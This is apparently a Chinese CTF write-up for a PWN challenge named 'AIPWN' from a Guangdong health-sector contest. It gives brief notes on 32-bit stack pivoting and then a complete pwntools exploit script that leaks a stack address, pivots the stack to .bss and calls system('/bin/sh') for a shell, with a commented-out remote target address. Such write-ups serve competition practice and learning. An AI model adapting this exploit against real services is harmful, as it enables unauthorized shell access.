---
title: 广东卫生网赛 PWN
date: '2025-04-11 18:23:49'
updated: '2025-04-12 19:46:01'
---
## AIPWN
32 位栈迁移

### 重点
1. 32 位传参是从栈上取参数，得在栈上放字符串地址
2. 栈迁移到 bss 段前面调用到 system 之后会报段错误，是因为在进去 system 之后会 pop 一堆，让 rsp 从 bss 段挪到了前面的 data 段或者 got 表，没有写权限就报错了

exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=process("./AIPWN")
# link=remote('36.212.14.99',27719)
elf=ELF("./AIPWN")

gdb.attach(link,'b *0x8048631')
pause()

bss_base=0x804A038+0x800
# pop_edi_ebp=0x80486ca
system=elf.plt["system"]
call_system=0x8048650
leave_ret=0x080484a5

payload=b'a'*0x38
link.recvuntil(b'world')
link.send(payload)

ebp_addr=u32(link.recvuntil('\xff')[-4:].ljust(4,b'\x00'))-0x28
print('ebpaddr='+hex(ebp_addr))

link.recvuntil(b'getshell')
payload=b'/bin/sh\x00'+b'b'*0x28+p32(bss_base)+p32(0x80485A7)
link.send(payload)

payload=b'a'*0x38
link.send(payload)

link.recvuntil(b'getshell')
payload=p32(call_system)+p32(0x804a810)+b'/bin/sh\x00'+b'a'*0x20+p32(bss_base-0x34)+p32(leave_ret)
link.send(payload)

link.interactive()
```

